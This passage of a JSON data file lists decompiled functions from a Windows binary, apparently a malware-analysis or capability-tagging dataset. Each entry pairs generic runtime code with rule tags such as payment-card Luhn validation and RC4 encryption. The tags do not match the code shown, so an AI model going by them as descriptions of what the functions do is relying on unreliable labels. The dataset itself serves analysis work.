        "decompiled_code": "\nvoid __fastcall fcn.004150e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00414e78();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.004150a8();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403720();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.00414dd8();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 245
    },
    "0041515c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041515c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    sub.kernel32.dll_InitializeCriticalSection();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 191
    },
    "004151b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004151b0(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x4151bb;\n    *NULL = fcn.00404324();\n    puStack16 = 0x4151c9;\n    var_5h._0_1_ = extraout_DL;\n    fcn.004152b4();\n    iStack20 = 0x415213;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00403f58();\n    fcn.00403f48();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41521a;\n    iStack20 = 0x415206;\n    fcn.00415318();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x415212;\n    sub.kernel32.dll_DeleteCriticalSection();\n    return;\n}\n",
        "token_count": 267
    },
    "00415318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415318(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00415518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00415518(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x4155ce;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.00404e38();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00403e38();\n        fcn.00405004();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00403e38();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040c6a4(1, &var_114h);\n    fcn.004047cc();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x4155d5;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 349
    },
    "00415a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00415a48(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 8) = uVar1;\n    fcn.00415800();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 198
    },
    "00415fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415fb8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41605f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x415fe2;\n    fcn.00416128();\n    uStack48 = 0x416042;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x416049;\n    uStack48 = 0x416041;\n    fcn.004161e4();\n    return;\n}\n",
        "token_count": 354
    },
    "00416070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416070(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x416088;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x416098;\n        fcn.00416128();\n        uStack24 = 0x416110;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        (**(*in_EAX + 0x44))();\n        *(in_EAX + 1) = *(param_2 + 4);\n        *(in_EAX + 0xd) = *(param_2 + 0xd);\n        *(in_EAX + 3) = *(param_2 + 0xc);\n        *(in_EAX + 5) = *(param_2 + 5);\n        fcn.00404df4();\n        *(in_EAX + 0xe) = *(param_2 + 0xe);\n        (**(*in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x416121;\n        uStack24 = 0x41610f;\n        fcn.004161e4();\n        return;\n    }\n    puStack20 = 0x416121;\n    fcn.00415504();\n    return;\n}\n",
        "token_count": 371
    },
    "00416198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416198(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.00416cf8;\n    fcn.00416140(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 90
    },
    "004161f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004161f8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41628d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.004051b0();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x416294;\n    uStack44 = 0x41628c;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 337
    },
    "004162a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004162a4(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.004162a0();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040c5e8(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00404d94();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x004047ed. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 198
    },
    "00416334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416334(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41640f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x416362;\n    fcn.00416128();\n    uStack52 = 0x4163ea;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x4163f1;\n    uStack52 = 0x4163e9;\n    fcn.004161e4();\n    return;\n}\n",
        "token_count": 354
    },
    "004165b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004165b8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x416630;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x416637;\n    uStack36 = 0x41662f;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 264
    },
    "00416644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416644(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_4h = 0;\n    uStack44 = 0x416707;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_ch = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.00416e20();\n            fcn.00404f88();\n            iVar1 = fcn.0040d2dc();\n            if (iVar1 != 0) {\n                fcn.004052c4(&fcn.00416644::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x004166e4;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_ch = -1;\ncode_r0x004166e4:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41670e;\n    uStack44 = 0x4166fe;\n    fcn.00404dc4();\n    uStack44 = 0x416706;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 468
    },
    "004167d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004167d0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41686d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x4167f8;\n    fcn.00416128();\n    uStack40 = 0x416850;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.00417530();\n    fcn.00404e90();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x416857;\n    uStack40 = 0x41684f;\n    fcn.004161e4();\n    return;\n}\n",
        "token_count": 302
    },
    "0041687c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041687c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41691d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x4168ab;\n        fcn.00416128();\n        uStack44 = 0x416900;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x416907;\n        uStack48 = 0x4168ff;\n        fcn.004161e4();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x416924;\n    uStack32 = 0x41691c;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 369
    },
    "00416960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416960(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x416a04;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x416987;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004198e8();\n    puStack32 = 0x41698f;\n    fcn.00416128();\n    uStack36 = 0x4169df;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.00418834();\n        if (cVar1 != '\\0') break;\n        fcn.0041a5c4();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4169e6;\n    uStack36 = 0x4169de;\n    fcn.004161e4();\n    return;\n}\n",
        "token_count": 382
    },
    "00416cf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00416cf8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x416d6e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.0041b19c();\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041b258();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    fcn.0041b1a4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x416d75;\n    uStack36 = 0x416d6d;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 264
    },
    "00417170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417170(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 38
    },
    "00417244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417244(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[7] == in_EAX[8]) {\n        fcn.00417170();\n    }\n    if (in_EDX < in_EAX[7]) {\n        fcn.00402ee0();\n    }\n    puVar1 = in_EAX[6] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.00404df4();\n    in_EAX[7] = in_EAX[7] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 192
    },
    "00417530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00417530(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 55
    },
    "0041761c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041761c(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00403e38();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040c6a4(0, &var_8h);\n    fcn.004047cc();\n    return;\n}\n",
        "token_count": 117
    },
    "004178c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004178c0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x4178dc;\n    fcn.00417f80(0x1000);\n    uStackY28 = 0x417910;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.0041a174();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x417917;\n    uStackY28 = 0x41790f;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 189
    },
    "00417920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00417920(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "004179e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004179e4(uint32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.00417a28(0, arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "00417dd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417dd4(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_DL = extraout_DL;\n    }\n    fcn.00403f28();\n    noname_0 = 0;\n    fcn.00405264();\n    fcn.00417ecc(noname_0, arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = noname_0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 169
    },
    "00417f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417f80(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402ce4();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 210
    },
    "004180cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004180cc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.00404df4();\n    fcn.00404df4();\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 225
    },
    "0041866c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041866c(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040c6a4(0, auStack12);\n    fcn.004047cc();\n    return;\n}\n",
        "token_count": 65
    },
    "00418b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00418b7c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.00403e30();\n    do {\n        if (iVar2 == *0x412ac4) {\n            if (*(in_EAX + 0x84) == 0) {\n                uVar4 = fcn.004145f0();\n            }\n            else {\n                uVar4 = fcn.004144f0();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.00414578();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.00403e4c();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.00403ee4();\n    } while( true );\n}\n",
        "token_count": 305
    },
    "00418da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418da8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x418dbb;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x418e48;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.00418834();\n    if (cVar1 == '\\0') {\n        fcn.00415bac();\n    }\n    while( true ) {\n        cVar1 = fcn.00418834();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.00418c2c();\n        if (cVar1 - 2U < 3) {\n            fcn.00419838();\n        }\n        fcn.00415ae0();\n        fcn.004198e8();\n        while( true ) {\n            cVar1 = fcn.00418834();\n            if (cVar1 != '\\0') break;\n            fcn.00419a54();\n        }\n        fcn.004198f0();\n    }\n    fcn.004198f0();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x418e4f;\n    uStack24 = 0x418e47;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 369
    },
    "00419518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
